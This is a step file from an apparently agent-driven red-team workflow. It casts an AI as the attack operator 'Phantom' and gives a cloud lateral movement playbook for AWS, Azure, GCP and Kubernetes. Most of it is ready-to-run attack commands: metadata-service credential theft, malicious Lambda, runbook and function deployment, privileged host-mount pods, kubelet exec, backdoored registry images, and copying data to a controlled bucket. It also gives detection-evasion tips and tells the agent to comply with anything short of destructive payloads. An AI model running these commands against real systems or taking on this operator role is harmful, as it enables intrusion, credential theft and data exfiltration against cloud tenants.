# Step 7: Cloud Lateral Movement

**Progress: Step 7 of 10** — Next: Network Pivoting & Tunneling

## STEP GOAL:

Execute cloud-specific lateral movement techniques across AWS, Azure, and GCP environments. Pivot between cloud services, accounts, subscriptions, and projects using IAM abuse, metadata services, service principal manipulation, and Kubernetes cluster exploitation. Document all cloud movement with ATT&CK mapping.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER modify production cloud infrastructure without explicit operator authorization — cloud APIs log EVERYTHING and changes are permanent audit trail entries
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE AN ATTACK OPERATOR executing authorized cloud lateral movement
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 Cloud lateral movement ONLY — on-prem Windows/Linux is steps 04-05, AD is step-06
- ⚡ If step-01 classified Cloud as N/A, perform brief applicability confirmation then proceed to [C]
- ☁️ Cloud APIs log EVERYTHING — CloudTrail/Azure Monitor/Cloud Audit Logs capture every API call
- 🔑 Cloud lateral movement IS credential-based — there is no "network" movement, it is all API access
- 🌐 Cross-account/subscription pivoting amplifies access dramatically — assess blast radius before executing

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - Cloud API calls are comprehensively logged (CloudTrail, Azure Activity Log, GCP Cloud Audit Logs) and cannot be disabled by the operator — every action is auditable and SIEM-integrated organizations WILL see it
  - Cross-account role assumption in AWS / cross-subscription access in Azure creates trust chain logs that cloud security posture management (CSPM) tools flag as anomalous — assess CSPM monitoring posture
  - Metadata service abuse (IMDSv1/v2) on EC2/Azure VMs/GCE instances extracts temporary credentials that have short TTL — plan the lateral movement to complete within token lifetime
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present cloud lateral movement plan organized by provider before beginning
- ⚠️ Present [A]/[W]/[C] menu after all cloud lateral movement techniques are assessed
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Step-02 recon (cloud resources, accounts, subscriptions, projects), step-03 credentials (cloud tokens, access keys, service principals, managed identities), steps 04-06 lateral movement results (may provide instance-level access for metadata exploitation)
- Focus: Cloud service lateral movement — pivoting between cloud resources, accounts, and projects via API access
- Limits: Stay within RoE cloud scope. Assume ALL actions are logged. Verify cross-account/subscription targets are in scope before attempting.
- Dependencies: step-02-internal-recon.md, step-03-credential-operations.md

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Applicability Check

**Determine if cloud lateral movement applies to this engagement:**

- If NO cloud environment identified → document "N/A — on-premise only, no cloud attack surface" → proceed to Menu → [C]
- If cloud environment confirmed → identify provider(s) and current cloud access:

| Field | Value |
|-------|-------|
| Cloud Provider(s) | {{AWS/Azure/GCP/Multi-cloud}} |
| Current Cloud Identity | {{ARN/UPN/ServiceAccount email}} |
| Identity Type | {{IAM User/Role/Service Principal/Managed Identity/Service Account}} |
| Current Permissions Summary | {{known permissions or "unknown — enumeration required"}} |
| Credential Source | {{step-03 finding / metadata service / environment variable / config file}} |
| Credential Lifetime | {{permanent keys / temporary token with expiry}} |
| Cloud Security Monitoring | {{GuardDuty/Defender for Cloud/SCC/CSPM tools from step-02}} |
| Cross-Account/Subscription Targets | {{identified in step-02 recon}} |

### 2. Cloud Environment Assessment

**Map the cloud attack surface before attempting lateral movement:**

**Cloud Security Posture Assessment (MANDATORY):**

| Security Tool | Provider | Status | Detection Capabilities | Impact on Lateral Movement |
|--------------|----------|--------|----------------------|---------------------------|
| AWS GuardDuty | AWS | Active/Inactive | Unusual API calls, credential exfiltration, crypto mining, DNS exfiltration | HIGH — ML-based anomaly detection on CloudTrail |
| AWS Security Hub | AWS | Active/Inactive | Aggregates findings from GuardDuty, Inspector, Macie | MEDIUM — centralized alerting |
| Azure Defender for Cloud | Azure | Active/Inactive | Unusual operations, suspicious access, threat intelligence | HIGH — behavioral analysis |
| Azure Sentinel | Azure | Active/Inactive | SIEM with analytics rules on Azure Activity | HIGH — custom detection rules |
| GCP Security Command Center | GCP | Active/Inactive | Vulnerability findings, threat detection, asset inventory | HIGH — centralized security |
| GCP Chronicle | GCP | Active/Inactive | SIEM with detection rules on Cloud Audit Logs | HIGH — custom rules + YARA-L |
| CSPM Tools | Any | Active/Inactive | {{Wiz/Orca/Prisma Cloud/Lacework}} | VARIABLE — misconfiguration + runtime |

**Present Cloud Position Table (per provider):**

| Provider | Account/Subscription/Project | Current Identity | Access Level | Key Resources | Cross-Account Trust |
|----------|-------------------------------|-----------------|-------------|---------------|-------------------|
| {{provider}} | {{account_id}} | {{identity}} | {{level}} | {{resources}} | {{trusts}} |

### 3. AWS Lateral Movement (T1078.004, T1550.001)

**3a. Cross-Account Role Assumption (T1550.001):**

| Step | Command | Purpose |
|------|---------|---------|
| Identify current identity | `aws sts get-caller-identity` | Verify current account and role |
| Enumerate assumable roles | `aws iam list-roles \| grep -A 5 "AssumeRolePolicyDocument"` | Find roles with trust to current account |
| Check cross-account trusts | Review trust policies for roles allowing `sts:AssumeRole` from current account | Identify lateral targets |
| Assume role in target account | `aws sts assume-role --role-arn arn:aws:iam::{{target_account}}:role/{{role_name}} --role-session-name phantom` | Cross-account pivot |
| Role chaining | Assume role A → assume role B from A's position → reach otherwise-unreachable accounts | Multi-hop cloud lateral |
| Verify new identity | `aws sts get-caller-identity` (with new credentials) | Confirm cross-account access |

**Cross-account trust policy analysis:**
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::{{source_account}}:root"},
  "Action": "sts:AssumeRole",
  "Condition": {"StringEquals": {"sts:ExternalId": "{{external_id}}"}}
}
```
- If `ExternalId` is required but unknown — cannot assume without it
- If `ExternalId` is NOT required — confused deputy vulnerability, easier to exploit
- If Principal is `"*"` — any AWS account can assume the role (critical misconfiguration)

**OPSEC considerations:**
- Every `sts:AssumeRole` call is logged in CloudTrail of BOTH source and target accounts
- GuardDuty finding: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` if using instance creds from outside the instance
- Role session name is visible in CloudTrail — use innocuous names
- Assumed role credentials have limited lifetime (default 1 hour, max 12 hours) — plan accordingly

**3b. EC2 Instance Lateral Movement:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| SSM Session Manager | `aws ssm start-session --target {{instance_id}}` | SSM agent + IAM permission | Shell on target instance |
| EC2 Instance Connect | `aws ec2-instance-connect send-ssh-public-key --instance-id {{id}} --instance-os-user {{user}} --ssh-public-key file://key.pub` | Instance Connect configured | 60-second SSH key push |
| SSM Run Command | `aws ssm send-command --instance-ids "{{id}}" --document-name "AWS-RunShellScript" --parameters commands="{{command}}"` | SSM agent + IAM permission | Remote command execution |
| User Data modification | `aws ec2 modify-instance-attribute --instance-id {{id}} --attribute userData --value $(echo '#!/bin/bash\n{{command}}' \| base64)` | Requires instance stop/start | Code exec at next boot |

**OPSEC considerations:**
- SSM sessions are logged in CloudTrail (`StartSession`, `TerminateSession`) and SSM Session Manager logs
- SSM Run Command logs full command in CloudTrail and SSM command history
- EC2 Instance Connect push is logged in CloudTrail and visible for 60 seconds only
- User data modification requires instance stop/start — visible in CloudTrail and causes downtime

**3c. Lambda Lateral Movement:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| Modify existing function | `aws lambda update-function-code --function-name {{name}} --zip-file fileb://payload.zip` | `lambda:UpdateFunctionCode` permission | Code exec in Lambda VPC/role |
| Create new function | `aws lambda create-function --function-name {{name}} --runtime python3.9 --handler lambda_function.handler --role {{role_arn}} --zip-file fileb://payload.zip` | `lambda:CreateFunction` + `iam:PassRole` | Code exec in target role |
| Invoke function | `aws lambda invoke --function-name {{name}} output.json` | `lambda:InvokeFunction` | Trigger execution |
| Lambda layers | `aws lambda publish-layer-version --layer-name {{name}} --zip-file fileb://layer.zip` → attach to function | `lambda:PublishLayerVersion` | Inject code into existing functions |
| Extract env vars | `aws lambda get-function-configuration --function-name {{name}} --query "Environment.Variables"` | `lambda:GetFunctionConfiguration` | Credential extraction |

**OPSEC considerations:**
- All Lambda API calls logged in CloudTrail
- Function modification generates CloudTrail `UpdateFunctionCode20150331v2` event
- Lambda execution logs go to CloudWatch Logs — invocation and output visible
- Lambda roles may have VPC access — pivot to VPC-internal resources

**3d. S3/EBS/EFS Data Access:**

| Vector | Command | Purpose |
|--------|---------|---------|
| Cross-account S3 | `aws s3 ls s3://{{bucket}} --profile {{assumed_role}}` | Access shared buckets |
| EBS snapshot sharing | `aws ec2 describe-snapshots --owner-ids {{target_account}} --restorable-by-user-ids self` | Find shared snapshots |
| Mount shared snapshot | Create volume from snapshot → attach to controlled instance → mount | Access target data offline |
| EFS mount targets | `aws efs describe-mount-targets --file-system-id {{fs_id}}` → mount in target VPC | Shared filesystem access |

**3e. ECS/EKS Lateral Movement:**

| Vector | Command | Result |
|--------|---------|--------|
| ECS task definition | `aws ecs register-task-definition --cli-input-json file://malicious-task.json` | Deploy container with target role |
| ECS run task | `aws ecs run-task --cluster {{cluster}} --task-definition {{task}} --launch-type FARGATE` | Execute in target VPC |
| EKS kubeconfig | `aws eks update-kubeconfig --name {{cluster}} --region {{region}}` | Get K8s API access |
| EKS pod creation | `kubectl run phantom --image={{image}} --overrides='{{pod_spec}}'` | Exec in EKS cluster |

**3f. AWS Metadata Service (T1552.005):**

| Step | Command | Purpose |
|------|---------|---------|
| Probe IMDSv1 | `curl -s http://169.254.169.254/latest/meta-data/` | Check metadata accessibility |
| Probe IMDSv2 | `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/` | IMDSv2 with token |
| Get role name | `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Identify instance role |
| Get credentials | `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{{role_name}}` | Extract AccessKeyId, SecretAccessKey, Token |
| Export credentials | `export AWS_ACCESS_KEY_ID={{key}} && export AWS_SECRET_ACCESS_KEY={{secret}} && export AWS_SESSION_TOKEN={{token}}` | Configure CLI |
| Verify identity | `aws sts get-caller-identity` | Confirm role assumption |
| Enumerate permissions | `enumerate-iam.py --access-key {{key}} --secret-key {{secret}} --session-token {{token}}` | Map role permissions |

**OPSEC considerations:**
- IMDSv2 enforcement (`HttpTokens: required`) blocks IMDSv1 access — check instance metadata options
- Metadata service access is NOT logged in CloudTrail — the extraction itself is invisible
- USING the extracted credentials IS logged — every API call with the role's temporary creds appears in CloudTrail
- GuardDuty detects instance credentials used from outside the instance IP: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- Token lifetime is typically 6 hours — must complete operations within window

**AWS Organizations traversal:**
- If management account accessed: `aws organizations list-accounts` — enumerate all member accounts
- `aws organizations list-roots` → `aws organizations list-organizational-units-for-parent` — map OU structure
- SCPs may restrict operations in member accounts — `aws organizations list-policies-for-target --target-id {{account_id}} --filter SERVICE_CONTROL_POLICY`
- If OrganizationAccountAccessRole exists: `aws sts assume-role --role-arn arn:aws:iam::{{member_account}}:role/OrganizationAccountAccessRole --role-session-name phantom`

**Tools:** Pacu (`run iam__enum_permissions`, `run iam__escalate_permissions`), enumerate-iam, ScoutSuite, Prowler

**Document all AWS lateral movement:**
```
| ID | Technique | T-Code | Source Account | Target Account/Resource | Credential | Result | CloudTrail Events |
|----|-----------|--------|---------------|------------------------|-----------|--------|-------------------|
| AWS-001 | {{technique}} | T{{code}} | {{src}} | {{tgt}} | {{cred}} | {{result}} | {{events}} |
```

### 4. Azure Lateral Movement (T1078.004, T1550.001)

**4a. Managed Identity Abuse:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| System-assigned MI token | `curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"` | VM with system MI | Azure ARM token |
| User-assigned MI token | `curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id={{mi_client_id}}"` | VM with user MI | Azure ARM token |
| Token for different resources | Change `resource=` to: `https://graph.microsoft.com/`, `https://vault.azure.net/`, `https://database.windows.net/` | Different resource scopes | Access to Graph, Key Vault, SQL |
| Use token | `az account get-access-token --resource https://management.azure.com/` or REST API with `Authorization: Bearer {{token}}` | Token obtained | Authenticated API access |

**Managed Identity enumeration after token extraction:**
```bash
# Get current identity
az account show

# List role assignments for the managed identity
az role assignment list --assignee {{mi_object_id}} --all

# List accessible resources
az resource list --subscription {{sub_id}}

# Check Key Vault access
az keyvault list && az keyvault secret list --vault-name {{vault_name}}
```

**OPSEC considerations:**
- IMDS access is NOT logged in Azure Activity Log — token extraction is invisible
- All subsequent API calls WITH the token ARE logged in Azure Activity Log
- Managed Identity tokens are short-lived (default 24 hours for ARM, varies by resource)
- If the MI has Reader role on multiple subscriptions — enumerate all of them for pivot opportunities

**4b. Azure Automation / Runbook Lateral Movement:**

| Step | Command | Purpose |
|------|---------|---------|
| Enumerate automation accounts | `az automation account list` | Find automation accounts |
| List runbooks | `az automation runbook list --automation-account-name {{name}} --resource-group {{rg}}` | Find existing runbooks |
| Create malicious runbook | `az automation runbook create --automation-account-name {{name}} --resource-group {{rg}} --name phantom --type PowerShell` | Deploy execution vehicle |
| Upload content | `az automation runbook replace-content --automation-account-name {{name}} --resource-group {{rg}} --name phantom --content @payload.ps1` | Upload payload |
| Publish and start | `az automation runbook publish --name phantom ...` then `az automation runbook start --name phantom ...` | Execute as automation identity |

**Automation account Run As accounts** (classic, being deprecated):
- Run As accounts use service principals with certificate authentication
- If cert is accessible: `Connect-AzAccount -ServicePrincipal -CertificateThumbprint {{thumb}} -ApplicationId {{app_id}} -TenantId {{tenant}}`
- Often have Contributor role on the subscription — significant lateral movement potential

**OPSEC considerations:**
- Runbook creation and execution logged in Azure Activity Log
- Automation Job output is stored in Azure — commands and results visible
- Automation accounts often have high-privilege managed identities — valuable pivot targets
- Run As certificates may be stored in Azure Key Vault or Automation certificate store

**4c. Function App / Logic App Pivot:**

| Vector | Command | Purpose |
|--------|---------|---------|
| List Function Apps | `az functionapp list` | Find function apps |
| Get function identity | `az functionapp identity show --name {{name}} --resource-group {{rg}}` | Check managed identity |
| Deploy malicious function | `az functionapp deployment source config-zip --name {{name}} --resource-group {{rg}} --src payload.zip` | Code execution as function identity |
| Modify existing function | `az functionapp config appsettings set --name {{name}} --resource-group {{rg}} --settings "WEBSITE_RUN_FROM_PACKAGE={{url}}"` | Replace function code |
| Logic App secrets | `az rest --method get --uri "/subscriptions/{{sub}}/resourceGroups/{{rg}}/providers/Microsoft.Logic/workflows/{{name}}/triggers/manual/listCallbackUrl?api-version=2016-06-01"` | Extract trigger URLs with SAS tokens |

**4d. Azure AD Application Abuse:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| Add credentials to existing app | `az ad app credential reset --id {{app_id}} --credential-description "phantom"` | Application owner or App Admin | Service principal access |
| Multi-tenant app exploitation | Identify apps with `availableToOtherTenants: true` | Multi-tenant app exists | Cross-tenant pivot |
| Consent grant | `az ad app permission grant --id {{app_id}} --api 00000003-0000-0000-c000-000000000000 --scope "User.ReadWrite.All Directory.ReadWrite.All"` | Application Admin | Broad Graph API access |
| OAuth token theft | Extract tokens from `.azure/`, `azureProfile.json`, `msal_token_cache.json` | File access on dev machine | User/app identity theft |

**OPSEC considerations:**
- Application credential reset generates Azure AD audit log event
- Consent grants are logged and may trigger admin consent workflow
- Defender for Cloud flags unusual application permission grants
- Multi-tenant app abuse creates audit trail in both tenants

**4e. Subscription Pivoting:**

| Step | Command | Purpose |
|------|---------|---------|
| List subscriptions | `az account list --all` | Find accessible subscriptions |
| Switch subscription | `az account set --subscription {{sub_id}}` | Pivot to target subscription |
| Enumerate resources | `az resource list --subscription {{sub_id}}` | Map resources in target sub |
| Management group traversal | `az account management-group list` | Map management group hierarchy |
| Cross-sub identity | If same MI/SP has roles in multiple subs | Identify shared identity access | Lateral via shared identity |

**4f. Key Vault Lateral Movement:**

| Step | Command | Purpose |
|------|---------|---------|
| List vaults | `az keyvault list` | Enumerate accessible vaults |
| List secrets | `az keyvault secret list --vault-name {{vault}}` | Enumerate secret names |
| Get secret | `az keyvault secret show --vault-name {{vault}} --name {{secret}}` | Extract secret value |
| List keys | `az keyvault key list --vault-name {{vault}}` | Enumerate crypto keys |
| List certificates | `az keyvault certificate list --vault-name {{vault}}` | Enumerate certificates |
| Download certificate | `az keyvault certificate download --vault-name {{vault}} --name {{cert}} --file cert.pem` | Extract cert + private key |

Key Vault secrets often contain: storage account keys, database connection strings, API keys, service principal certificates, SSH private keys, encryption keys

**4g. Azure Resource Manager Lateral Movement:**

| Vector | Command | Purpose |
|--------|---------|---------|
| Custom Script Extension | `az vm extension set --resource-group {{rg}} --vm-name {{vm}} --name CustomScriptExtension --publisher Microsoft.Compute --settings '{"commandToExecute":"{{command}}"}'` | Code exec on target VM |
| Run Command | `az vm run-command invoke --resource-group {{rg}} --name {{vm}} --command-id RunShellScript --scripts "{{command}}"` | Remote command execution |
| ARM template deployment | `az deployment group create --resource-group {{rg}} --template-file malicious.json` | Deploy resources with embedded code |

**Tools:** ROADtools (`roadrecon gather`, `roadrecon gui`), AzureHound, MicroBurst, PowerZure, AADInternals, TokenTactics

**Document all Azure lateral movement:**
```
| ID | Technique | T-Code | Source Sub/Tenant | Target Resource | Identity | Result | Activity Log Events |
|----|-----------|--------|-------------------|----------------|----------|--------|-------------------|
| AZ-001 | {{technique}} | T{{code}} | {{src}} | {{tgt}} | {{identity}} | {{result}} | {{events}} |
```

### 5. GCP Lateral Movement (T1078.004)

**5a. Service Account Impersonation:**

| Step | Command | Condition | Result |
|------|---------|----------|--------|
| List SAs in project | `gcloud iam service-accounts list --project {{project}}` | `iam.serviceAccounts.list` | Enumerate service accounts |
| Generate access token | `gcloud auth print-access-token --impersonate-service-account={{sa_email}}` | `iam.serviceAccounts.getAccessToken` | Impersonate SA |
| Create SA key | `gcloud iam service-accounts keys create key.json --iam-account={{sa_email}}` | `iam.serviceAccountKeys.create` | Persistent SA access |
| Activate SA key | `gcloud auth activate-service-account --key-file=key.json` | Key file obtained | Authenticate as SA |
| Sign JWT/Blob | `gcloud iam service-accounts sign-blob --iam-account={{sa_email}} data.txt signed.txt` | `iam.serviceAccounts.signBlob` | Token forging |

**Service Account impersonation chain:**
- SA-A can impersonate SA-B → SA-B can impersonate SA-C → chain to reach SA-C from SA-A position
- Each impersonation hop is logged separately in Cloud Audit Logs
- `--impersonate-service-account` flag in gcloud transparently handles the chain

**OPSEC considerations:**
- Token generation logged as `GenerateAccessToken` in Cloud Audit Logs
- SA key creation logged as `CreateServiceAccountKey` — permanent credential, HIGH visibility
- Keys do NOT expire by default — must be explicitly deleted for cleanup
- GCP recommends Workload Identity over SA keys — key creation may trigger CSPM alerts

**5b. Compute Instance Lateral Movement:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| OS Login SSH | `gcloud compute ssh {{instance}} --zone {{zone}}` | OS Login enabled + IAM permission | SSH to instance |
| Metadata SSH key injection | `gcloud compute instances add-metadata {{instance}} --zone {{zone}} --metadata ssh-keys="phantom:{{ssh_pub_key}}"` | `compute.instances.setMetadata` | SSH access via injected key |
| Serial console | `gcloud compute connect-to-serial-port {{instance}} --zone {{zone}}` | `compute.instances.use` + serial port enabled | Console access |
| Startup script injection | `gcloud compute instances add-metadata {{instance}} --zone {{zone}} --metadata startup-script='#!/bin/bash\n{{command}}'` | `compute.instances.setMetadata` | Code exec at next boot |
| Custom image | Create image with backdoor → deploy new instance from image | `compute.images.create` | Persistent access via image |

**OPSEC considerations:**
- Metadata modification logged in Cloud Audit Logs as `v1.compute.instances.setMetadata`
- SSH key injection via metadata is project-wide if set on project metadata — affects ALL instances
- OS Login creates user based on IAM identity — visible in `/etc/passwd` and `lastlog`
- Startup scripts execute as root — powerful but only at boot time

**5c. GKE Lateral Movement:**

| Vector | Command | Condition | Result |
|--------|---------|----------|--------|
| Get GKE credentials | `gcloud container clusters get-credentials {{cluster}} --zone {{zone}}` | `container.clusters.get` | kubectl access |
| Workload Identity abuse | From compromised pod: `curl -s -H "Metadata-Flavor:Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"` | Workload Identity configured | GCP SA token from pod |
| Pod-to-pod | `kubectl exec -it {{pod}} -n {{namespace}} -- /bin/bash` | RBAC allows exec | Enter other pods |
| Secret enumeration | `kubectl get secrets -A -o yaml` | RBAC allows secret read | All cluster secrets |
| Node compromise | If pod escapes to node → access all pods on that node + node SA | Container escape | Full node access |

**5d. Cross-Project Pivoting:**

| Step | Command | Purpose |
|------|---------|---------|
| List projects | `gcloud projects list` | Enumerate accessible projects |
| Check permissions per project | `gcloud projects get-iam-policy {{project}}` | Map cross-project access |
| Shared VPC access | `gcloud compute shared-vpc list-associated-resources {{host_project}}` | Find shared network resources |
| Cross-project SA impersonation | `gcloud auth print-access-token --impersonate-service-account={{sa}}@{{other_project}}.iam.gserviceaccount.com` | Cross-project SA with impersonation rights | Access other project resources |
| Organization-level access | `gcloud organizations list` → `gcloud organizations get-iam-policy {{org_id}}` | Check org-level permissions |

**5e. Cloud Functions / Cloud Run Lateral Movement:**

| Vector | Command | Purpose |
|--------|---------|---------|
| Deploy function | `gcloud functions deploy phantom --runtime python39 --trigger-http --entry-point handler --source ./payload --service-account {{sa_email}} --project {{project}}` | Code exec as target SA |
| List functions | `gcloud functions list --project {{project}}` | Enumerate existing functions |
| Get function env vars | `gcloud functions describe {{name}} --project {{project}} --format='value(environmentVariables)'` | Extract secrets from env vars |
| Invoke function | `gcloud functions call {{name}} --data '{"command":"{{cmd}}"}'` | Trigger execution |
| Cloud Run service | `gcloud run deploy phantom --image {{image}} --service-account {{sa_email}} --project {{project}}` | Container exec as target SA |

**5f. BigQuery / GCS Data Access:**

| Vector | Command | Purpose |
|--------|---------|---------|
| List buckets | `gsutil ls -p {{project}}` | Enumerate storage |
| Cross-project bucket access | `gsutil ls gs://{{bucket}}` | Test access to other project buckets |
| BigQuery datasets | `bq ls --project_id {{project}}` | Enumerate datasets |
| Cross-project BigQuery | `bq query --use_legacy_sql=false 'SELECT * FROM \`{{project}}.{{dataset}}.{{table}}\` LIMIT 10'` | Access cross-project data |
| Exfiltrate to controlled bucket | `gsutil cp gs://{{target_bucket}}/{{file}} gs://{{controlled_bucket}}/` | Data access / staging |

**Tools:** ScoutSuite (`scout gcp`), GCPBucketBrute, Hayat (GCP privilege escalation), gcp_enum, gcphound

**Document all GCP lateral movement:**
```
| ID | Technique | T-Code | Source Project | Target Project/Resource | Identity | Result | Audit Log Events |
|----|-----------|--------|---------------|------------------------|----------|--------|-----------------|
| GCP-001 | {{technique}} | T{{code}} | {{src}} | {{tgt}} | {{identity}} | {{result}} | {{events}} |
```

### 6. Kubernetes-Specific Lateral Movement (Multi-Cloud) (T1610, T1611, T1613)

**Kubernetes-specific techniques applicable across EKS, AKS, and GKE:**

**6a. Service Account Token Harvesting:**

| Step | Command | Purpose |
|------|---------|---------|
| Read mounted token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | Extract SA token |
| Read CA cert | `cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt` | K8s API CA cert |
| Read namespace | `cat /var/run/secrets/kubernetes.io/serviceaccount/namespace` | Current namespace |
| Authenticate to API | `curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces` | K8s API access |
| Check permissions | `kubectl auth can-i --list` (from within pod) | Enumerate RBAC permissions |

**6b. Pod-to-Pod Lateral Movement:**

| Vector | Condition | Method | OPSEC |
|--------|----------|--------|-------|
| Direct pod IP access | No NetworkPolicy / permissive NetworkPolicy | `curl http://{{pod_ip}}:{{port}}` | LOW — standard cluster traffic |
| Service DNS resolution | Service exists | `curl http://{{service}}.{{namespace}}.svc.cluster.local:{{port}}` | LOW — normal service mesh traffic |
| kubectl exec | SA has exec permissions | `kubectl exec -it {{pod}} -n {{ns}} -- /bin/bash` | MEDIUM — logged in K8s audit |
| Sidecar injection | Webhook control or deployment access | Modify pod spec to inject sidecar container | HIGH — visible in deployment history |

**6c. Secrets and ConfigMap Exploitation:**

```bash
# Enumerate secrets across namespaces
kubectl get secrets -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type"

# Extract specific secret
kubectl get secret {{name}} -n {{namespace}} -o jsonpath='{.data}' | base64 -d

# Common high-value secrets:
# - docker-registry secrets (pull/push credentials)
# - TLS secrets (private keys + certificates)
# - Opaque secrets (application credentials, API keys, database passwords)
# - service-account-token secrets (SA tokens for impersonation)

# ConfigMap extraction
kubectl get configmap -A -o yaml | grep -i password -A 2 -B 2
```

**6d. Node Compromise via Kubernetes:**

| Vector | Command | Prerequisite | Result |
|--------|---------|-------------|--------|
| Privileged pod creation | `kubectl run phantom --image=alpine --overrides='{"spec":{"containers":[{"name":"phantom","image":"alpine","stdin":true,"tty":true,"securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'` | Pod creation RBAC + no PodSecurityPolicy/Standards | Host filesystem access |
| Kubelet API abuse | `curl -sk https://{{node_ip}}:10250/pods` → `curl -sk https://{{node_ip}}:10250/run/{{namespace}}/{{pod}}/{{container}} -d "cmd={{command}}"` | Unauthenticated kubelet (anonymous auth) | Code exec in any pod on node |
| etcd access | `etcdctl --endpoints=https://{{etcd_ip}}:2379 --cacert={{ca}} --cert={{cert}} --key={{key}} get / --prefix --keys-only` | etcd credentials or unauthenticated | ALL cluster secrets |

**6e. Container Registry Poisoning:**

- Enumerate registry: `kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' \| tr ' ' '\n' \| sort -u`
- If registry is writable: push backdoored image with same tag → next pod creation pulls malicious image
- `docker pull {{registry}}/{{image}}:{{tag}} && docker tag {{image}} {{registry}}/{{image}}:{{tag}} && docker push {{registry}}/{{image}}:{{tag}}`

**Tools:**
- `kubeletctl` — direct kubelet API interaction: `kubeletctl -s {{node}} pods`, `kubeletctl -s {{node}} exec -p {{pod}} -c {{container}} "{{command}}"`
- `peirates` — K8s penetration testing: credential theft, pod creation, token harvesting
- `CDK` — container toolkit: `cdk evaluate` (environment scan), `cdk exploit` (auto-exploit)
- `kube-hunter` — vulnerability scanning: `kube-hunter --remote {{cluster_ip}}`
- `kubectl-who-can` — RBAC analysis: `kubectl who-can create pods -n kube-system`

**OPSEC considerations:**
- Kubernetes audit logs capture ALL API server requests — every kubectl command is recorded
- Falco rules detect: privileged pod creation, sensitive mount, unexpected shell in container, service account token read
- OPA/Gatekeeper policies may block privileged pods, host mounts, specific images
- Network policies restrict pod-to-pod traffic — check before assuming connectivity
- Pod Security Standards (Baseline/Restricted) may prevent privileged pod creation

**Document all Kubernetes lateral movement:**
```
| ID | Cluster | Vector | Source Pod/Node | Target Pod/Node | SA/Identity | Result | Detection Risk |
|----|---------|--------|----------------|----------------|------------|--------|----------------|
| K8S-001 | {{cluster}} | {{vector}} | {{src}} | {{tgt}} | {{identity}} | {{result}} | {{risk}} |
```

### 7. Multi-Cloud Pivoting

**Exploit trust relationships between cloud providers and between on-prem and cloud:**

**7a. AWS to Azure / Azure to AWS:**

| Pivot Path | Mechanism | Exploitation |
|-----------|-----------|-------------|
| AWS → Azure | OIDC federation (AWS STS → Azure AD) | If Azure AD trusts AWS STS as identity provider → use AWS credentials to get Azure tokens |
| Azure → AWS | Azure AD OIDC → AWS IAM Identity Provider | If AWS trusts Azure AD as OIDC provider → use Azure tokens to assume AWS roles |
| Shared credentials | Same credentials/keys stored in both providers | If step-03 found keys valid for both → direct cross-provider access |
| CI/CD pipelines | GitHub Actions / Azure DevOps / CodeBuild with cross-cloud secrets | Pipeline credential extraction → cross-provider access |

**7b. Azure to GCP / GCP to Azure:**

| Pivot Path | Mechanism | Exploitation |
|-----------|-----------|-------------|
| Azure → GCP | Workload Identity Federation (Azure AD → GCP) | If GCP trusts Azure AD as identity provider → exchange Azure token for GCP token |
| GCP → Azure | Azure AD federated credentials | If Azure AD app has federated credential from GCP → exchange GCP token for Azure token |

**7c. On-Prem to Cloud / Cloud to On-Prem:**

| Pivot Path | Mechanism | Exploitation |
|-----------|-----------|-------------|
| AD → Azure AD | Azure AD Connect (password hash sync, pass-through auth, federation) | If AD Connect server compromised: extract MSOL account password → DCSync Azure AD |
| AD → Azure | Hybrid Joined Devices | Compromise hybrid-joined device → get both AD and Azure AD tokens |
| AD → AWS | AWS SSO (IAM Identity Center) with AD as identity source | AD credentials → AWS SSO → AWS account access |
| AD → GCP | GCP Workforce Identity Federation with AD | AD credentials → GCP token exchange → GCP access |
